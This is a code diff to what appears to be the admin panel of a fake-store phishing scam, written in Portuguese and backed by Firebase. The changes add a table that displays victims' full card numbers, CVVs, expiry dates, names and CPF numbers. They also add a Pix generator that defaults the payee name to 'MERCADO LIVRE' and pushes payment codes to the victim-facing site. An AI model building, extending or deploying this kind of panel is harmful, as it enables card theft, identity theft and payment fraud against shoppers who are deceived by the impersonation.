@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Painel Admin</title>
+  <script src="https://cdn.jsdelivr.net/npm/pix-br-code@1.0.1/dist/index.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #0a0e14; color: #e0e0e0; font-size: 14px; min-height: 100vh; }
@@ -40,6 +41,7 @@
     .card.pix .valor { color: #00bfff; }
     .card.copiados .valor { color: #ff8800; }
     .card.visitas .valor { color: #aa88ff; }
+    .card.cartoes .valor { color: #ff5577; }
 
     .secao { padding: 0 24px 24px; }
     .secao h2 { font-size: 16px; margin-bottom: 16px; color: #e0e0e0; display: flex; align-items: center; gap: 8px; }
@@ -57,6 +59,7 @@
     .status.copiou { background: #4d3d00; color: #ffcc00; }
     .status.pendente { background: #2a3544; color: #6a7a8c; }
     .status.pago { background: #0a3d1f; color: #00ff88; }
+    .status.cartao { background: #3d0022; color: #ff5577; }
 
     .btn-confirmar { background: #00ff88; color: #0a0e14; border: none; padding: 8px 16px;
       border-radius: 6px; font-weight: 700; font-size: 12px; cursor: pointer; }
@@ -77,6 +80,27 @@
     .vazio { text-align: center; padding: 40px; color: #6a7a8c; font-size: 14px; }
     .detalhes { font-size: 12px; color: #6a7a8c; line-height: 1.6; }
     .detalhes strong { color: #e0e0e0; }
+    .cartao-dados { background: #0a0e14; border: 1px solid #3d0022; border-radius: 6px;
+      padding: 8px; margin-top: 4px; font-size: 12px; line-height: 1.7; }
+    .cartao-dados .num { color: #ff5577; font-family: monospace; font-weight: 700; letter-spacing: 0.5px; }
+    .cartao-dados .label { color: #6a7a8c; font-size: 11px; }
+    .cartao-dados .val { color: #e0e0e0; font-weight: 600; }
+
+    /* PIX CONFIG */
+    .pix-config { background: #131a24; border: 1px solid #2a3544; border-radius: 12px; padding: 20px; margin-bottom: 24px; }
+    .pix-config h3 { font-size: 14px; color: #00ff88; margin-bottom: 16px; }
+    .pix-config label { display: block; font-size: 12px; color: #6a7a8c; margin-bottom: 6px; }
+    .pix-config input { width: 100%; padding: 12px; background: #0a0e14; border: 1px solid #2a3544;
+      border-radius: 8px; color: #e0e0e0; font-size: 14px; margin-bottom: 16px; outline: none; }
+    .pix-config input:focus { border-color: #00ff88; }
+    .pix-config button { background: #00ff88; color: #0a0e14; border: none; padding: 12px 24px;
+      border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; width: 100%; }
+    .pix-config button:hover { background: #00cc6a; }
+    .pix-preview { margin-top: 16px; display: none; text-align: center; background: #0a0e14;
+      border-radius: 8px; padding: 16px; border: 1px solid #2a3544; }
+    .pix-preview img { max-width: 180px; margin: 0 auto 12px; }
+    .pix-preview input { font-size: 12px; margin-bottom: 8px; }
+    .pix-preview button { background: #2a3544; color: #00ff88; font-size: 12px; padding: 8px; width: auto; }
   </style>
 </head>
 <body>
@@ -125,9 +149,32 @@
         <div class="label">📋 Pix copiados</div>
         <div class="valor" id="cardCopiados">0</div>
       </div>
+      <div class="card cartoes">
+        <div class="label">💳 Cartões enviados</div>
+        <div class="valor" id="cardCartoes">0</div>
+      </div>
       <div class="card">
         <div class="label">💰 Valor total pedidos</div>
         <div class="valor" id="cardValor" style="color:#00ff88">R$ 0,00</div>
+      </div>
+    </div>
+
+    <!-- CONFIG PIX -->
+    <div class="secao">
+      <h2>💠 Configurar Pix</h2>
+      <div class="pix-config">
+        <label>Chave Pix (CPF, e-mail, telefone ou aleatória)</label>
+        <input type="text" id="chavePixInput" placeholder="Digite sua chave Pix">
+        <label>Nome do recebedor</label>
+        <input type="text" id="nomeRecebedor" placeholder="Seu nome" value="MERCADO LIVRE">
+        <label>Cidade</label>
+        <input type="text" id="cidadeRecebedor" placeholder="Sua cidade" value="SAO PAULO">
+        <button onclick="gerarPixConfig()">Gerar e enviar para o site</button>
+        <div class="pix-preview" id="pixPreview">
+          <img id="pixQrPreview" src="" alt="QR Code">
+          <input type="text" id="pixCopiaColaPreview" readonly>
+          <button onclick="copiarPreview()">Copiar</button>
+        </div>
       </div>
     </div>
 
@@ -140,13 +187,14 @@
             <th>Cliente / Login</th>
             <th>Status</th>
             <th>Pix</th>
+            <th>Cartão</th>
             <th>Valor</th>
             <th>Entrou</th>
             <th>Ações</th>
           </tr>
         </thead>
         <tbody id="corpoPedidos">
-          <tr><td colspan="6" class="vazio">Nenhum pedido ainda...</td></tr>
+          <tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr>
         </tbody>
       </table>
     </div>
@@ -183,7 +231,6 @@
 
     const SENHA_ADMIN = 'admin123';
 
-    /* Entrar */
     function entrar() {
       const s = document.getElementById('senhaAdmin').value;
       if (s === SENHA_ADMIN) {
@@ -195,24 +242,18 @@
       }
     }
 
-    function sair() {
-      location.reload();
-    }
+    function sair() { location.reload(); }
 
-    /* Alerta sonoro */
     function tocarAlerta() {
       try {
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
         const osc = ctx.createOscillator();
         const gain = ctx.createGain();
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.frequency.value = 880;
-        osc.type = 'sine';
+        osc.connect(gain); gain.connect(ctx.destination);
+        osc.frequency.value = 880; osc.type = 'sine';
         gain.gain.setValueAtTime(0.3, ctx.currentTime);
         gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
-        osc.start();
-        osc.stop(ctx.currentTime + 0.3);
+        osc.start(); osc.stop(ctx.currentTime + 0.3);
       } catch(e) {}
     }
 
@@ -222,7 +263,7 @@
       return d.toLocaleString('pt-BR', { day:'2-digit', month:'2-digit', hour:'2-digit', minute:'2-digit' });
     }
 
-    let stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, valor: 0 };
+    let stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, cartoes: 0, valor: 0 };
     let pedidos = {};
     let visitasMap = {};
 
@@ -232,7 +273,15 @@
       document.getElementById('cardCliques').textContent = stats.cliques;
       document.getElementById('cardPix').textContent = stats.pix;
       document.getElementById('cardCopiados').textContent = stats.copiados;
+      document.getElementById('cardCartoes').textContent = stats.cartoes;
       document.getElementById('cardValor').textContent = 'R$ ' + stats.valor.toFixed(2).replace('.', ',');
+    }
+
+    /* FORMATA NÚMERO DO CARTÃO */
+    function formatNumCartao(num) {
+      if (!num) return '-';
+      const limpo = num.replace(/\s/g, '');
+      return limpo.replace(/(.{4})/g, '$1 ').trim();
     }
 
     function renderPedidos() {
@@ -241,7 +290,7 @@
       document.getElementById('countPedidos').textContent = ids.length;
 
       if (ids.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="6" class="vazio">Nenhum pedido ainda...</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr>';
         return;
       }
 
@@ -259,9 +308,25 @@
         let statusTxt = 'Só visitou';
         let statusClass = 'pendente';
         if (p.status === 'pago') { statusTxt = '✅ Pago'; statusClass = 'pago'; }
+        else if (p.cartao) { statusTxt = '💳 Cartão enviado'; statusClass = 'cartao'; }
         else if (pixCopiado) { statusTxt = '📋 Copiou Pix'; statusClass = 'copiou'; }
         else if (p.pix) { statusTxt = '💠 Gerou Pix'; statusClass = 'pendente'; }
         else if (p.clicouComprar) { statusTxt = '🛒 Clicou comprar'; statusClass = 'pendente'; }
+
+        /* DADOS DO CARTÃO */
+        let cartaoHtml = '-';
+        if (p.cartao) {
+          const c = p.cartao;
+          cartaoHtml = `
+            <div class="cartao-dados">
+              <div class="num">💳 ${formatNumCartao(c.numero)}</div>
+              <div><span class="label">Nome:</span> <span class="val">${c.nome || '-'}</span></div>
+              <div><span class="label">Validade:</span> <span class="val">${c.validade || '-'}</span></div>
+              <div><span class="label">CVV:</span> <span class="val">${c.cvv || '-'}</span></div>
+              <div><span class="label">CPF:</span> <span class="val">${c.cpf || '-'}</span></div>
+            </div>
+          `;
+        }
 
         return `<tr>
           <td>
@@ -276,6 +341,7 @@
             ${p.pix ? '<strong>Chave:</strong> ' + p.pix.chave.substring(0, 20) + '...<br><strong>Gerado:</strong> ' + fmt(p.pix.geradoEm) : '-'}
             ${pixCopiado ? '<br><strong>Copiado:</strong> ' + fmt(pixCopiadoEm) : ''}
           </td>
+          <td>${cartaoHtml}</td>
           <td><strong>R$ ${valor}</strong></td>
           <td class="detalhes">${fmt(v.entrouEm || p.logadoEm)}</td>
           <td>
@@ -299,36 +365,27 @@
       db.ref('visitas/' + id).remove();
     }
 
-    /* LIMPAR TUDO */
     function limparTudo() {
       const c1 = confirm('🧹 ATENÇÃO!\n\nIsso vai apagar TODOS os dados:\n• Visitas\n• Pedidos\n• Alertas\n\nTem certeza?');
       if (!c1) return;
-
       const c2 = confirm('⚠️ ÚLTIMA CONFIRMAÇÃO\n\nTodos os dados serão perdidos PERMANENTEMENTE.\n\nConfirmar limpeza total?');
       if (!c2) return;
-
       const senha = prompt('Digite a senha de admin para confirmar:');
       if (senha !== SENHA_ADMIN) {
         alert('❌ Senha incorreta. Limpeza cancelada.');
         return;
       }
-
       Promise.all([
         db.ref('visitas').remove(),
         db.ref('pedidos').remove(),
         db.ref('alertas').remove()
       ]).then(() => {
-        stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, valor: 0 };
-        pedidos = {};
-        visitasMap = {};
+        stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, cartoes: 0, valor: 0 };
+        pedidos = {}; visitasMap = {};
         window._ultimoAlertaCount = 0;
-        atualizarCards();
-        renderPedidos();
-        renderAlertas([]);
+        atualizarCards(); renderPedidos(); renderAlertas([]);
         alert('✅ Tudo limpo com sucesso!');
-      }).catch(err => {
-        alert('❌ Erro ao limpar: ' + err.message);
-      });
+      }).catch(err => alert('❌ Erro ao limpar: ' + err.message));
     }
 
     function renderAlertas(lista) {
@@ -338,12 +395,50 @@
         return;
       }
       tbody.innerHTML = lista.slice(-20).reverse().map(a => `
-        <tr>
-          <td>${a.tipo || '?'}</td>
-          <td>${a.clienteId || '-'}</td>
-          <td>${fmt(a.timestamp)}</td>
-        </tr>
+        <tr><td>${a.tipo || '?'}</td><td>${a.clienteId || '-'}</td><td>${fmt(a.timestamp)}</td></tr>
       `).join('');
+    }
+
+    /* GERAR PIX COM pix-br-code */
+    async function gerarPixConfig() {
+      const chave = document.getElementById('chavePixInput').value.trim();
+      const nome = document.getElementById('nomeRecebedor').value.trim() || 'MERCADO LIVRE';
+      const cidade = document.getElementById('cidadeRecebedor').value.trim() || 'SAO PAULO';
+
+      if (!chave) { alert('Digite a chave Pix'); return; }
+
+      /* Valor padrão do pedido */
+      const valor = 159.44;
+
+      try {
+        const copiaECola = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now());
+        const qrCode = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now(), true);
+
+        document.getElementById('pixQrPreview').src = qrCode;
+        document.getElementById('pixCopiaColaPreview').value = copiaECola;
+        document.getElementById('pixPreview').style.display = 'block';
+
+        /* Salva no Firebase para o site do cliente escutar */
+        await db.ref('pixConfig').update({
+          chave: copiaECola,
+          qrCode: qrCode,
+          valor: valor.toFixed(2).replace('.', ','),
+          nome: nome,
+          cidade: cidade,
+          atualizadoEm: Date.now()
+        });
+
+        alert('✅ Pix gerado e enviado para o site do cliente!');
+      } catch(e) {
+        alert('❌ Erro ao gerar Pix: ' + e.message);
+      }
+    }
+
+    function copiarPreview() {
+      const input = document.getElementById('pixCopiaColaPreview');
+      input.select();
+      document.execCommand('copy');
+      alert('Código copiado!');
     }
 
     function iniciarPainel() {
@@ -360,32 +455,28 @@
         });
         stats.online = online;
         stats.visitas = Object.keys(visitasMap).length;
-        atualizarCards();
-        renderPedidos();
+        atualizarCards(); renderPedidos();
       });
 
       db.ref('pedidos').on('value', snap => {
         pedidos = snap.val() || {};
-        let cliques = 0, pix = 0, copiados = 0, valor = 0;
+        let cliques = 0, pix = 0, copiados = 0, cartoes = 0, valor = 0;
         Object.values(pedidos).forEach(p => {
           if (p.clicouComprar) cliques++;
           if (p.pix) pix++;
           if (p.pix && p.pix.copiado) copiados++;
+          if (p.cartao) cartoes++;
           valor += (p.valor || 0);
         });
-        stats.cliques = cliques;
-        stats.pix = pix;
-        stats.copiados = copiados;
-        stats.valor = valor;
-        atualizarCards();
-        renderPedidos();
+        stats.cliques = cliques; stats.pix = pix; stats.copiados = copiados;
+        stats.cartoes = cartoes; stats.valor = valor;
+        atualizarCards(); renderPedidos();
       });
 
       db.ref('alertas').limitToLast(30).on('value', snap => {
         const v = snap.val() || {};
         renderAlertas(Object.values(v));
         renderPedidos();
-
         const valores = Object.values(v);
         if (valores.length > (window._ultimoAlertaCount || 0) && window._ultimoAlertaCount !== undefined) {
           tocarAlerta();
